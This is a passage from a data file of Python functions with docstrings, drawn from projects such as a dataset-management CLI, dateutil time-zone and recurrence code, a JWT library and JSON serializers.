            "def wrap_state_dict(self, typename: str, state) -> Dict[str, Any]:\n        \"\"\"\n        Wrap the marshalled state in a dictionary.\n\n        The returned dictionary has two keys, corresponding to the ``type_key`` and ``state_key``\n        options. The former holds the type name and the latter holds the marshalled state.\n\n        :param typename: registered name of the custom type\n        :param state: the marshalled state of the object\n        :return: an object serializable by the serializer\n\n        \"\"\"\n        return {self.type_key: typename, self.state_key: state}"
        ],
        [
            "def publish(quiet, dataset_uri):\n    \"\"\"Enable HTTP access to a dataset.\n\n    This only works on datasets in some systems. For example, datasets stored\n    in AWS S3 object storage and Microsoft Azure Storage can be published as\n    datasets accessible over HTTP. A published dataset is world readable.\n    \"\"\"\n    access_uri = http_publish(dataset_uri)\n    if not quiet:\n        click.secho(\"Dataset accessible at \", nl=False, fg=\"green\")\n    click.secho(access_uri)"
        ],
        [
            "def _prompt_for_values(d):\n    \"\"\"Update the descriptive metadata interactively.\n\n    Uses values entered by the user. Note that the function keeps recursing\n    whenever a value is another ``CommentedMap`` or a ``list``. The\n    function works as passing dictionaries and lists into a function edits\n    the values in place.\n    \"\"\"\n    for key, value in d.items():\n        if isinstance(value, CommentedMap):\n            _prompt_for_values(value)\n        elif isinstance(value, list):\n            for item in value:\n                _prompt_for_values(item)\n        else:\n            typ = type(value)\n\n            if isinstance(value, ScalarFloat):  # Deal with ruamel.yaml floats.\n                typ = float\n\n            new_value = click.prompt(key, type=typ, default=value)\n            d[key] = new_value\n    return d"
        ],
        [
            "def create(quiet, name, base_uri, symlink_path):\n    \"\"\"Create a proto dataset.\"\"\"\n    _validate_name(name)\n\n    admin_metadata = dtoolcore.generate_admin_metadata(name)\n    parsed_base_uri = dtoolcore.utils.generous_parse_uri(base_uri)\n\n    if parsed_base_uri.scheme == \"symlink\":\n        if symlink_path is None:\n            raise click.UsageError(\"Need to specify symlink path using the -s/--symlink-path option\")  # NOQA\n\n    if symlink_path:\n        base_uri = dtoolcore.utils.sanitise_uri(\n            \"symlink:\" + parsed_base_uri.path\n        )\n        parsed_base_uri = dtoolcore.utils.generous_parse_uri(base_uri)\n\n    # Create the dataset.\n    proto_dataset = dtoolcore.generate_proto_dataset(\n        admin_metadata=admin_metadata,\n        base_uri=dtoolcore.utils.urlunparse(parsed_base_uri),\n        config_path=CONFIG_PATH)\n\n    # If we are creating a symlink dataset we need to set the symlink_path\n    # attribute on the storage broker.\n    if symlink_path:\n        symlink_abspath = os.path.abspath(symlink_path)\n        proto_dataset._storage_broker.symlink_path = symlink_abspath\n    try:\n        proto_dataset.create()\n    except dtoolcore.storagebroker.StorageBrokerOSError as err:\n        raise click.UsageError(str(err))\n\n    proto_dataset.put_readme(\"\")\n\n    if quiet:\n        click.secho(proto_dataset.uri)\n    else:\n        # Give the user some feedback and hints on what to do next.\n        click.secho(\"Created proto dataset \", nl=False, fg=\"green\")\n        click.secho(proto_dataset.uri)\n        click.secho(\"Next steps: \")\n\n        step = 1\n\n        if parsed_base_uri.scheme != \"symlink\":\n            click.secho(\"{}. Add raw data, eg:\".format(step))\n            click.secho(\n                \"   dtool add item my_file.txt {}\".format(proto_dataset.uri),\n                fg=\"cyan\")\n\n            if parsed_base_uri.scheme == \"file\":\n                # Find the abspath of the data directory for user feedback.\n                data_path = proto_dataset._storage_broker._data_abspath\n                click.secho(\"   Or use your system commands, e.g: \")\n                click.secho(\n                    \"   mv my_data_directory {}/\".format(data_path),\n                    fg=\"cyan\"\n                )\n            step = step + 1\n\n        click.secho(\"{}. Add descriptive metadata, e.g: \".format(step))\n        click.secho(\n            \"   dtool readme interactive {}\".format(proto_dataset.uri),\n            fg=\"cyan\")\n        step = step + 1\n\n        click.secho(\n            \"{}. Convert the proto dataset into a dataset: \".format(step)\n        )\n        click.secho(\"   dtool freeze {}\".format(proto_dataset.uri), fg=\"cyan\")"
        ],
        [
            "def interactive(proto_dataset_uri):\n    \"\"\"Interactive prompting to populate the readme.\"\"\"\n    proto_dataset = dtoolcore.ProtoDataSet.from_uri(\n        uri=proto_dataset_uri,\n        config_path=CONFIG_PATH)\n\n    # Create an CommentedMap representation of the yaml readme template.\n    readme_template = _get_readme_template()\n    yaml = YAML()\n    yaml.explicit_start = True\n    yaml.indent(mapping=2, sequence=4, offset=2)\n    descriptive_metadata = yaml.load(readme_template)\n\n    descriptive_metadata = _prompt_for_values(descriptive_metadata)\n\n    # Write out the descriptive metadata to the readme file.\n    stream = StringIO()\n\n    yaml.dump(descriptive_metadata, stream)\n\n    proto_dataset.put_readme(stream.getvalue())\n\n    click.secho(\"Updated readme \", fg=\"green\")\n    click.secho(\"To edit the readme using your default editor:\")\n    click.secho(\n        \"dtool readme edit {}\".format(proto_dataset_uri),\n        fg=\"cyan\")"
        ],
        [
            "def edit(dataset_uri):\n    \"\"\"Default editor updating of readme content.\n    \"\"\"\n    try:\n        dataset = dtoolcore.ProtoDataSet.from_uri(\n            uri=dataset_uri,\n            config_path=CONFIG_PATH\n        )\n    except dtoolcore.DtoolCoreTypeError:\n        dataset = dtoolcore.DataSet.from_uri(\n            uri=dataset_uri,\n            config_path=CONFIG_PATH\n        )\n    readme_content = dataset.get_readme_content()\n\n    try:\n        # Python2 compatibility.\n        readme_content = unicode(readme_content, \"utf-8\")\n    except NameError:\n        pass\n\n    edited_content = click.edit(readme_content)\n    if edited_content is not None:\n        _validate_and_put_readme(dataset, edited_content)\n        click.secho(\"Updated readme \", nl=False, fg=\"green\")\n    else:\n        click.secho(\"Did not update readme \", nl=False, fg=\"red\")\n    click.secho(dataset_uri)"
        ],
        [
            "def show(dataset_uri):\n    \"\"\"Show the descriptive metadata in the readme.\"\"\"\n    try:\n        dataset = dtoolcore.ProtoDataSet.from_uri(\n            uri=dataset_uri,\n            config_path=CONFIG_PATH\n        )\n    except dtoolcore.DtoolCoreTypeError:\n        dataset = dtoolcore.DataSet.from_uri(\n            uri=dataset_uri,\n            config_path=CONFIG_PATH\n        )\n    readme_content = dataset.get_readme_content()\n    click.secho(readme_content)"
        ],
        [
            "def write(proto_dataset_uri, input):\n    \"\"\"Use YAML from a file or stdin to populate the readme.\n\n    To stream content from stdin use \"-\", e.g.\n\n    echo \"desc: my data\" | dtool readme write <DS_URI> -\n    \"\"\"\n    proto_dataset = dtoolcore.ProtoDataSet.from_uri(\n        uri=proto_dataset_uri\n    )\n    _validate_and_put_readme(proto_dataset, input.read())"
        ],
        [
            "def item(proto_dataset_uri, input_file, relpath_in_dataset):\n    \"\"\"Add a file to the proto dataset.\"\"\"\n    proto_dataset = dtoolcore.ProtoDataSet.from_uri(\n        proto_dataset_uri,\n        config_path=CONFIG_PATH)\n    if relpath_in_dataset == \"\":\n        relpath_in_dataset = os.path.basename(input_file)\n    proto_dataset.put_item(input_file, relpath_in_dataset)"
        ],
        [
            "def metadata(proto_dataset_uri, relpath_in_dataset, key, value):\n    \"\"\"Add metadata to a file in the proto dataset.\"\"\"\n    proto_dataset = dtoolcore.ProtoDataSet.from_uri(\n        uri=proto_dataset_uri,\n        config_path=CONFIG_PATH)\n    proto_dataset.add_item_metadata(\n        handle=relpath_in_dataset,\n        key=key,\n        value=value)"
        ],
        [
            "def freeze(proto_dataset_uri):\n    \"\"\"Convert a proto dataset into a dataset.\n\n    This step is carried out after all files have been added to the dataset.\n    Freezing a dataset finalizes it with a stamp marking it as frozen.\n    \"\"\"\n    proto_dataset = dtoolcore.ProtoDataSet.from_uri(\n        uri=proto_dataset_uri,\n        config_path=CONFIG_PATH\n    )\n\n    num_items = len(list(proto_dataset._identifiers()))\n    max_files_limit = int(dtoolcore.utils.get_config_value(\n        \"DTOOL_MAX_FILES_LIMIT\",\n        CONFIG_PATH,\n        10000\n    ))\n    assert isinstance(max_files_limit, int)\n    if num_items > max_files_limit:\n        click.secho(\n            \"Too many items ({} > {}) in proto dataset\".format(\n                num_items,\n                max_files_limit\n            ),\n            fg=\"red\"\n        )\n        click.secho(\"1. Consider splitting the dataset into smaller datasets\")\n        click.secho(\"2. Consider packaging small files using tar\")\n        click.secho(\"3. Increase the limit using the DTOOL_MAX_FILES_LIMIT\")\n        click.secho(\"   environment variable\")\n        sys.exit(2)\n\n    handles = [h for h in proto_dataset._storage_broker.iter_item_handles()]\n    for h in handles:\n        if not valid_handle(h):\n            click.secho(\n                \"Invalid item name: {}\".format(h),\n                fg=\"red\"\n            )\n            click.secho(\"1. Consider renaming the item\")\n            click.secho(\"2. Consider removing the item\")\n            sys.exit(3)\n\n    with click.progressbar(length=len(list(proto_dataset._identifiers())),\n                           label=\"Generating manifest\") as progressbar:\n        try:\n            proto_dataset.freeze(progressbar=progressbar)\n        except dtoolcore.storagebroker.DiskStorageBrokerValidationWarning as e:\n            click.secho(\"\")\n            click.secho(str(e), fg=\"red\", nl=False)\n            sys.exit(4)\n\n    click.secho(\"Dataset frozen \", nl=False, fg=\"green\")\n    click.secho(proto_dataset_uri)"
        ],
        [
            "def cp(resume, quiet, dataset_uri, dest_base_uri):\n    \"\"\"Copy a dataset to a different location.\"\"\"\n    _copy(resume, quiet, dataset_uri, dest_base_uri)"
        ],
        [
            "def compress(obj, level=6, return_type=\"bytes\"):\n    \"\"\"Compress anything to bytes or string.\n\n    :params obj: \n    :params level: \n    :params return_type: if bytes, then return bytes; if str, then return\n      base64.b64encode bytes in utf-8 string. \n    \"\"\"\n    if isinstance(obj, binary_type):\n        b = zlib.compress(obj, level)\n    elif isinstance(obj, string_types):\n        b = zlib.compress(obj.encode(\"utf-8\"), level)\n    else:\n        b = zlib.compress(pickle.dumps(obj, protocol=2), level)\n\n    if return_type == \"bytes\":\n        return b\n    elif return_type == \"str\":\n        return base64.b64encode(b).decode(\"utf-8\")\n    else:\n        raise ValueError(\"'return_type' has to be one of 'bytes', 'str'!\")"
        ],
        [
            "def find_probable_year_index(self, tokens):\n        \"\"\"\n        attempt to deduce if a pre 100 year was lost\n         due to padded zeros being taken off\n        \"\"\"\n        for index, token in enumerate(self):\n            potential_year_tokens = _ymd.find_potential_year_tokens(\n                token, tokens)\n            if len(potential_year_tokens) == 1 and len(potential_year_tokens[0]) > 2:\n                return index"
        ],
        [
            "def tzname_in_python2(namefunc):\n    \"\"\"Change unicode output into bytestrings in Python 2\n\n    tzname() API changed in Python 3. It used to return bytes, but was changed\n    to unicode strings\n    \"\"\"\n    def adjust_encoding(*args, **kwargs):\n        name = namefunc(*args, **kwargs)\n        if name is not None and not PY3:\n            name = name.encode()\n\n        return name\n\n    return adjust_encoding"
        ],
        [
            "def _validate_fromutc_inputs(f):\n    \"\"\"\n    The CPython version of ``fromutc`` checks that the input is a ``datetime``\n    object and that ``self`` is attached as its ``tzinfo``.\n    \"\"\"\n    @wraps(f)\n    def fromutc(self, dt):\n        if not isinstance(dt, datetime):\n            raise TypeError(\"fromutc() requires a datetime argument\")\n        if dt.tzinfo is not self:\n            raise ValueError(\"dt.tzinfo is not self\")\n\n        return f(self, dt)\n\n    return fromutc"
        ],
        [
            "def fromutc(self, dt):\n        \"\"\" Given a datetime in UTC, return local time \"\"\"\n        if not isinstance(dt, datetime):\n            raise TypeError(\"fromutc() requires a datetime argument\")\n\n        if dt.tzinfo is not self:\n            raise ValueError(\"dt.tzinfo is not self\")\n\n        # Get transitions - if there are none, fixed offset\n        transitions = self.transitions(dt.year)\n        if transitions is None:\n            return dt + self.utcoffset(dt)\n\n        # Get the transition times in UTC\n        dston, dstoff = transitions\n\n        dston -= self._std_offset\n        dstoff -= self._std_offset\n\n        utc_transitions = (dston, dstoff)\n        dt_utc = dt.replace(tzinfo=None)\n\n        isdst = self._naive_isdst(dt_utc, utc_transitions)\n\n        if isdst:\n            dt_wall = dt + self._dst_offset\n        else:\n            dt_wall = dt + self._std_offset\n\n        _fold = int(not isdst and self.is_ambiguous(dt_wall))\n\n        return enfold(dt_wall, fold=_fold)"
        ],
        [
            "def strip_comment_line_with_symbol(line, start):\n    \"\"\"Strip comments from line string.\n    \"\"\"\n    parts = line.split(start)\n    counts = [len(findall(r'(?:^|[^\"\\\\]|(?:\\\\\\\\|\\\\\")+)(\")', part))\n              for part in parts]\n    total = 0\n    for nr, count in enumerate(counts):\n        total += count\n        if total % 2 == 0:\n            return start.join(parts[:nr + 1]).rstrip()\n    else:  # pragma: no cover\n        return line.rstrip()"
        ],
        [
            "def strip_comments(string, comment_symbols=frozenset(('#', '//'))):\n    \"\"\"Strip comments from json string.\n\n    :param string: A string containing json with comments started by comment_symbols.\n    :param comment_symbols: Iterable of symbols that start a line comment (default # or //).\n    :return: The string with the comments removed.\n    \"\"\"\n    lines = string.splitlines()\n    for k in range(len(lines)):\n        for symbol in comment_symbols:\n            lines[k] = strip_comment_line_with_symbol(lines[k], start=symbol)\n    return '\\n'.join(lines)"
        ],
        [
            "def picknthweekday(year, month, dayofweek, hour, minute, whichweek):\n    \"\"\" dayofweek == 0 means Sunday, whichweek 5 means last instance \"\"\"\n    first = datetime.datetime(year, month, 1, hour, minute)\n\n    # This will work if dayofweek is ISO weekday (1-7) or Microsoft-style (0-6),\n    # Because 7 % 7 = 0\n    weekdayone = first.replace(day=((dayofweek - first.isoweekday()) % 7) + 1)\n    wd = weekdayone + ((whichweek - 1) * ONEWEEK)\n    if (wd.month != month):\n        wd -= ONEWEEK\n\n    return wd"
        ],
        [
            "def valuestodict(key):\n    \"\"\"Convert a registry key's values to a dictionary.\"\"\"\n    dout = {}\n    size = winreg.QueryInfoKey(key)[1]\n    tz_res = None\n\n    for i in range(size):\n        key_name, value, dtype = winreg.EnumValue(key, i)\n        if dtype == winreg.REG_DWORD or dtype == winreg.REG_DWORD_LITTLE_ENDIAN:\n            # If it's a DWORD (32-bit integer), it's stored as unsigned - convert\n            # that to a proper signed integer\n            if value & (1 << 31):\n                value = value - (1 << 32)\n        elif dtype == winreg.REG_SZ:\n            # If it's a reference to the tzres DLL, load the actual string\n            if value.startswith('@tzres'):\n                tz_res = tz_res or tzres()\n                value = tz_res.name_from_string(value)\n\n            value = value.rstrip('\\x00')    # Remove trailing nulls\n\n        dout[key_name] = value\n\n    return dout"
        ],
        [
            "def name_from_string(self, tzname_str):\n        \"\"\"\n        Parse strings as returned from the Windows registry into the time zone\n        name as defined in the registry.\n\n        >>> from dateutil.tzwin import tzres\n        >>> tzr = tzres()\n        >>> print(tzr.name_from_string('@tzres.dll,-251'))\n        'Dateline Daylight Time'\n        >>> print(tzr.name_from_string('Eastern Standard Time'))\n        'Eastern Standard Time'\n\n        :param tzname_str:\n            A timezone name string as returned from a Windows registry key.\n\n        :return:\n            Returns the localized timezone string from tzres.dll if the string\n            is of the form `@tzres.dll,-offset`, else returns the input string.\n        \"\"\"\n        if not tzname_str.startswith('@'):\n            return tzname_str\n\n        name_splt = tzname_str.split(',-')\n        try:\n            offset = int(name_splt[1])\n        except:\n            raise ValueError(\"Malformed timezone string.\")\n\n        return self.load_name(offset)"
        ],
        [
            "def gettz(name):\n    \"\"\"\n    This retrieves a time zone from the local zoneinfo tarball that is packaged\n    with dateutil.\n\n    :param name:\n        An IANA-style time zone name, as found in the zoneinfo file.\n\n    :return:\n        Returns a :class:`dateutil.tz.tzfile` time zone object.\n\n    .. warning::\n        It is generally inadvisable to use this function, and it is only\n        provided for API compatibility with earlier versions. This is *not*\n        equivalent to ``dateutil.tz.gettz()``, which selects an appropriate\n        time zone based on the inputs, favoring system zoneinfo. This is ONLY\n        for accessing the dateutil-specific zoneinfo (which may be out of\n        date compared to the system zoneinfo).\n\n    .. deprecated:: 2.6\n        If you need to use a specific zoneinfofile over the system zoneinfo,\n        instantiate a :class:`dateutil.zoneinfo.ZoneInfoFile` object and call\n        :func:`dateutil.zoneinfo.ZoneInfoFile.get(name)` instead.\n\n        Use :func:`get_zonefile_instance` to retrieve an instance of the\n        dateutil-provided zoneinfo.\n    \"\"\"\n    warnings.warn(\"zoneinfo.gettz() will be removed in future versions, \"\n                  \"to use the dateutil-provided zoneinfo files, instantiate a \"\n                  \"ZoneInfoFile object and use ZoneInfoFile.zones.get() \"\n                  \"instead. See the documentation for details.\",\n                  DeprecationWarning)\n\n    if len(_CLASS_ZONE_INSTANCE) == 0:\n        _CLASS_ZONE_INSTANCE.append(ZoneInfoFile(getzoneinfofile_stream()))\n    return _CLASS_ZONE_INSTANCE[0].zones.get(name)"
        ],
        [
            "def gettz_db_metadata():\n    \"\"\" Get the zonefile metadata\n\n    See `zonefile_metadata`_\n\n    :returns:\n        A dictionary with the database metadata\n\n    .. deprecated:: 2.6\n        See deprecation warning in :func:`zoneinfo.gettz`. To get metadata,\n        query the attribute ``zoneinfo.ZoneInfoFile.metadata``.\n    \"\"\"\n    warnings.warn(\"zoneinfo.gettz_db_metadata() will be removed in future \"\n                  \"versions, to use the dateutil-provided zoneinfo files, \"\n                  \"ZoneInfoFile object and query the 'metadata' attribute \"\n                  \"instead. See the documentation for details.\",\n                  DeprecationWarning)\n\n    if len(_CLASS_ZONE_INSTANCE) == 0:\n        _CLASS_ZONE_INSTANCE.append(ZoneInfoFile(getzoneinfofile_stream()))\n    return _CLASS_ZONE_INSTANCE[0].metadata"
        ],
        [
            "def get_config(jid):\n    \"\"\"Get the configuration for the given JID based on XMPP_HTTP_UPLOAD_ACCESS.\n\n    If the JID does not match any rule, ``False`` is returned.\n    \"\"\"\n\n    acls = getattr(settings, 'XMPP_HTTP_UPLOAD_ACCESS', (('.*', False), ))\n\n    for regex, config in acls:\n        if isinstance(regex, six.string_types):\n            regex = [regex]\n\n        for subex in regex:\n            if re.search(subex, jid):\n                return config\n\n    return False"
        ],
        [
            "def datetime_exists(dt, tz=None):\n    \"\"\"\n    Given a datetime and a time zone, determine whether or not a given datetime\n    would fall in a gap.\n\n    :param dt:\n        A :class:`datetime.datetime` (whose time zone will be ignored if ``tz``\n        is provided.)\n\n    :param tz:\n        A :class:`datetime.tzinfo` with support for the ``fold`` attribute. If\n        ``None`` or not provided, the datetime's own time zone will be used.\n\n    :return:\n        Returns a boolean value whether or not the \"wall time\" exists in ``tz``.\n    \"\"\"\n    if tz is None:\n        if dt.tzinfo is None:\n            raise ValueError('Datetime is naive and no time zone provided.')\n        tz = dt.tzinfo\n\n    dt = dt.replace(tzinfo=None)\n\n    # This is essentially a test of whether or not the datetime can survive\n    # a round trip to UTC.\n    dt_rt = dt.replace(tzinfo=tz).astimezone(tzutc()).astimezone(tz)\n    dt_rt = dt_rt.replace(tzinfo=None)\n\n    return dt == dt_rt"
        ],
        [
            "def _set_tzdata(self, tzobj):\n        \"\"\" Set the time zone data of this object from a _tzfile object \"\"\"\n        # Copy the relevant attributes over as private attributes\n        for attr in _tzfile.attrs:\n            setattr(self, '_' + attr, getattr(tzobj, attr))"
        ],
        [
            "def normalized(self):\n        \"\"\"\n        Return a version of this object represented entirely using integer\n        values for the relative attributes.\n\n        >>> relativedelta(days=1.5, hours=2).normalized()\n        relativedelta(days=1, hours=14)\n\n        :return:\n            Returns a :class:`dateutil.relativedelta.relativedelta` object.\n        \"\"\"\n        # Cascade remainders down (rounding each to roughly nearest\n        # microsecond)\n        days = int(self.days)\n\n        hours_f = round(self.hours + 24 * (self.days - days), 11)\n        hours = int(hours_f)\n\n        minutes_f = round(self.minutes + 60 * (hours_f - hours), 10)\n        minutes = int(minutes_f)\n\n        seconds_f = round(self.seconds + 60 * (minutes_f - minutes), 8)\n        seconds = int(seconds_f)\n\n        microseconds = round(self.microseconds + 1e6 * (seconds_f - seconds))\n\n        # Constructor carries overflow back up with call to _fix()\n        return self.__class__(years=self.years, months=self.months,\n                              days=days, hours=hours, minutes=minutes,\n                              seconds=seconds, microseconds=microseconds,\n                              leapdays=self.leapdays, year=self.year,\n                              month=self.month, day=self.day,\n                              weekday=self.weekday, hour=self.hour,\n                              minute=self.minute, second=self.second,\n                              microsecond=self.microsecond)"
        ],
        [
            "def _hash(secret: bytes, data: bytes, alg: str) -> bytes:\n    \"\"\"\n    Create a new HMAC hash.\n\n    :param secret: The secret used when hashing data.\n    :type secret: bytes\n    :param data: The data to hash.\n    :type data: bytes\n    :param alg: The algorithm to use when hashing `data`.\n    :type alg: str\n    :return: New HMAC hash.\n    :rtype: bytes\n    \"\"\"\n    algorithm = get_algorithm(alg)\n    return hmac \\\n        .new(secret, msg=data, digestmod=algorithm) \\\n        .digest()"
        ],
        [
            "def decode(secret: Union[str, bytes], token: Union[str, bytes],\n           alg: str = default_alg) -> Tuple[dict, dict]:\n    \"\"\"\n    Decodes the given token's header and payload and validates the signature.\n\n    :param secret: The secret used to decode the token. Must match the\n        secret used when creating the token.\n    :type secret: Union[str, bytes]\n    :param token: The token to decode.\n    :type token: Union[str, bytes]\n    :param alg: The algorithm used to decode the token. Must match the\n        algorithm used when creating the token.\n    :type alg: str\n    :return: The decoded header and payload.\n    :rtype: Tuple[dict, dict]\n    \"\"\"\n    secret = util.to_bytes(secret)\n    token = util.to_bytes(token)\n    pre_signature, signature_segment = token.rsplit(b'.', 1)\n    header_b64, payload_b64 = pre_signature.split(b'.')\n    try:\n        header_json = util.b64_decode(header_b64)\n        header = json.loads(util.from_bytes(header_json))\n    except (json.decoder.JSONDecodeError, UnicodeDecodeError, ValueError):\n        raise InvalidHeaderError('Invalid header')\n    try:\n        payload_json = util.b64_decode(payload_b64)\n        payload = json.loads(util.from_bytes(payload_json))\n    except (json.decoder.JSONDecodeError, UnicodeDecodeError, ValueError):\n        raise InvalidPayloadError('Invalid payload')\n\n    if not isinstance(header, dict):\n        raise InvalidHeaderError('Invalid header: {}'.format(header))\n    if not isinstance(payload, dict):\n        raise InvalidPayloadError('Invalid payload: {}'.format(payload))\n\n    signature = util.b64_decode(signature_segment)\n    calculated_signature = _hash(secret, pre_signature, alg)\n\n    if not compare_signature(signature, calculated_signature):\n        raise InvalidSignatureError('Invalid signature')\n    return header, payload"
        ],
        [
            "def compare_signature(expected: Union[str, bytes],\n                      actual: Union[str, bytes]) -> bool:\n    \"\"\"\n    Compares the given signatures.\n\n    :param expected: The expected signature.\n    :type expected: Union[str, bytes]\n    :param actual: The actual signature.\n    :type actual: Union[str, bytes]\n    :return: Do the signatures match?\n    :rtype: bool\n    \"\"\"\n    expected = util.to_bytes(expected)\n    actual = util.to_bytes(actual)\n    return hmac.compare_digest(expected, actual)"
        ],
        [
            "def compare_token(expected: Union[str, bytes],\n                  actual: Union[str, bytes]) -> bool:\n    \"\"\"\n    Compares the given tokens.\n\n    :param expected: The expected token.\n    :type expected: Union[str, bytes]\n    :param actual: The actual token.\n    :type actual: Union[str, bytes]\n    :return: Do the tokens match?\n    :rtype: bool\n    \"\"\"\n    expected = util.to_bytes(expected)\n    actual = util.to_bytes(actual)\n    _, expected_sig_seg = expected.rsplit(b'.', 1)\n    _, actual_sig_seg = actual.rsplit(b'.', 1)\n    expected_sig = util.b64_decode(expected_sig_seg)\n    actual_sig = util.b64_decode(actual_sig_seg)\n    return compare_signature(expected_sig, actual_sig)"
        ],
        [
            "def valid(self, time: int = None) -> bool:\n        \"\"\"\n        Is the token valid? This method only checks the timestamps within the\n        token and compares them against the current time if none is provided.\n\n        :param time: The timestamp to validate against\n        :type time: Union[int, None]\n        :return: The validity of the token.\n        :rtype: bool\n        \"\"\"\n        if time is None:\n            epoch = datetime(1970, 1, 1, 0, 0, 0)\n            now = datetime.utcnow()\n            time = int((now - epoch).total_seconds())\n        if isinstance(self.valid_from, int) and time < self.valid_from:\n            return False\n        if isinstance(self.valid_to, int) and time > self.valid_to:\n            return False\n        return True"
        ],
        [
            "def _pop_claims_from_payload(self):\n        \"\"\"\n        Check for registered claims in the payload and move them to the\n        registered_claims property, overwriting any extant claims.\n        \"\"\"\n        claims_in_payload = [k for k in self.payload.keys() if\n                             k in registered_claims.values()]\n        for name in claims_in_payload:\n            self.registered_claims[name] = self.payload.pop(name)"
        ],
        [
            "def encode(self) -> str:\n        \"\"\"\n        Create a token based on the data held in the class.\n\n        :return: A new token\n        :rtype: str\n        \"\"\"\n        payload = {}\n        payload.update(self.registered_claims)\n        payload.update(self.payload)\n        return encode(self.secret, payload, self.alg, self.header)"
        ],
        [
            "def decode(secret: Union[str, bytes], token: Union[str, bytes],\n               alg: str = default_alg) -> 'Jwt':\n        \"\"\"\n        Decodes the given token into an instance of `Jwt`.\n\n        :param secret: The secret used to decode the token. Must match the\n            secret used when creating the token.\n        :type secret: Union[str, bytes]\n        :param token: The token to decode.\n        :type token: Union[str, bytes]\n        :param alg: The algorithm used to decode the token. Must match the\n            algorithm used when creating the token.\n        :type alg: str\n        :return: The decoded token.\n        :rtype: `Jwt`\n        \"\"\"\n        header, payload = decode(secret, token, alg)\n        return Jwt(secret, payload, alg, header)"
        ],
        [
            "def compare(self, jwt: 'Jwt', compare_dates: bool = False) -> bool:\n        \"\"\"\n        Compare against another `Jwt`.\n\n        :param jwt: The token to compare against.\n        :type jwt: Jwt\n        :param compare_dates: Should the comparision take dates into account?\n        :type compare_dates: bool\n        :return: Are the two Jwt's the same?\n        :rtype: bool\n        \"\"\"\n        if self.secret != jwt.secret:\n            return False\n        if self.payload != jwt.payload:\n            return False\n        if self.alg != jwt.alg:\n            return False\n        if self.header != jwt.header:\n            return False\n        expected_claims = self.registered_claims\n        actual_claims = jwt.registered_claims\n        if not compare_dates:\n            strip = ['exp', 'nbf', 'iat']\n            expected_claims = {k: {v if k not in strip else None} for k, v in\n                               expected_claims.items()}\n            actual_claims = {k: {v if k not in strip else None} for k, v in\n                             actual_claims.items()}\n        if expected_claims != actual_claims:\n            return False\n        return True"
        ],
        [
            "def get(self, request, hash, filename):\n        \"\"\"Download a file.\"\"\"\n        if _ws_download is True:\n            return HttpResponseForbidden()\n        upload = Upload.objects.uploaded().get(hash=hash, name=filename)\n\n        return FileResponse(upload.file, content_type=upload.type)"
        ],
        [
            "def is_compressed_json_file(abspath):\n    \"\"\"Test a file is a valid json file.\n\n    - *.json: uncompressed, utf-8 encode json file\n    - *.js: uncompressed, utf-8 encode json file\n    - *.gz: compressed, utf-8 encode json file\n    \"\"\"\n    abspath = abspath.lower()\n    fname, ext = os.path.splitext(abspath)\n    if ext in [\".json\", \".js\"]:\n        is_compressed = False\n    elif ext == \".gz\":\n        is_compressed = True\n    else:\n        raise ValueError(\n            \"'%s' is not a valid json file. \"\n            \"extension has to be '.json' or '.js' for uncompressed, '.gz' \"\n            \"for compressed.\" % abspath)\n    return is_compressed"
        ],
        [
            "def dump_set(self, obj, class_name=set_class_name):\n        \"\"\"\n        ``set`` dumper.\n        \"\"\"\n        return {\"$\" + class_name: [self._json_convert(item) for item in obj]}"
        ],
        [
            "def dump_deque(self, obj, class_name=\"collections.deque\"):\n        \"\"\"\n        ``collections.deque`` dumper.\n        \"\"\"\n        return {\"$\" + class_name: [self._json_convert(item) for item in obj]}"
        ],
        [
            "def dump_OrderedDict(self, obj, class_name=\"collections.OrderedDict\"):\n        \"\"\"\n        ``collections.OrderedDict`` dumper.\n        \"\"\"\n        return {\n            \"$\" + class_name: [\n                (key, self._json_convert(value)) for key, value in iteritems(obj)\n            ]\n        }"
        ],
        [
            "def dump_nparray(self, obj, class_name=numpy_ndarray_class_name):\n        \"\"\"\n        ``numpy.ndarray`` dumper.\n        \"\"\"\n        return {\"$\" + class_name: self._json_convert(obj.tolist())}"
        ],
        [
            "def _invalidates_cache(f):\n    \"\"\"\n    Decorator for rruleset methods which may invalidate the\n    cached length.\n    \"\"\"\n\n    def inner_func(self, *args, **kwargs):\n        rv = f(self, *args, **kwargs)\n        self._invalidate_cache()\n        return rv\n\n    return inner_func"
        ],
        [
            "def before(self, dt, inc=False):\n        \"\"\" Returns the last recurrence before the given datetime instance. The\n            inc keyword defines what happens if dt is an occurrence. With\n            inc=True, if dt itself is an occurrence, it will be returned. \"\"\"\n        if self._cache_complete:\n            gen = self._cache\n        else:\n            gen = self\n        last = None\n        if inc:\n            for i in gen:\n                if i > dt:\n                    break\n                last = i\n        else:\n            for i in gen:\n                if i >= dt:\n                    break\n                last = i\n        return last"
        ],
        [
            "def after(self, dt, inc=False):\n        \"\"\" Returns the first recurrence after the given datetime instance. The\n            inc keyword defines what happens if dt is an occurrence. With\n            inc=True, if dt itself is an occurrence, it will be returned.  \"\"\"\n        if self._cache_complete:\n            gen = self._cache\n        else:\n            gen = self\n        if inc:\n            for i in gen:\n                if i >= dt:\n                    return i\n        else:\n            for i in gen:\n                if i > dt:\n                    return i\n        return None"
        ],
        [
            "def xafter(self, dt, count=None, inc=False):\n        \"\"\"\n        Generator which yields up to `count` recurrences after the given\n        datetime instance, equivalent to `after`.\n\n        :param dt:\n            The datetime at which to start generating recurrences.\n\n        :param count:\n            The maximum number of recurrences to generate. If `None` (default),\n            dates are generated until the recurrence rule is exhausted.\n\n        :param inc:\n            If `dt` is an instance of the rule and `inc` is `True`, it is\n            included in the output.\n\n        :yields: Yields a sequence of `datetime` objects.\n        \"\"\"\n\n        if self._cache_complete:\n            gen = self._cache\n        else:\n            gen = self\n\n        # Select the comparison function\n        if inc:\n            def comp(dc, dtc): return dc >= dtc\n        else:\n            def comp(dc, dtc): return dc > dtc\n\n        # Generate dates\n        n = 0\n        for d in gen:\n            if comp(d, dt):\n                if count is not None:\n                    n += 1\n                    if n > count:\n                        break\n\n                yield d"
        ],
        [
            "def replace(self, **kwargs):\n        \"\"\"Return new rrule with same attributes except for those attributes given new\n           values by whichever keyword arguments are specified.\"\"\"\n        new_kwargs = {\"interval\": self._interval,\n                      \"count\": self._count,\n                      \"dtstart\": self._dtstart,\n                      \"freq\": self._freq,\n                      \"until\": self._until,\n                      \"wkst\": self._wkst,\n                      \"cache\": False if self._cache is None else True}\n        new_kwargs.update(self._original_rule)\n        new_kwargs.update(kwargs)\n        return rrule(**new_kwargs)"
        ],
        [
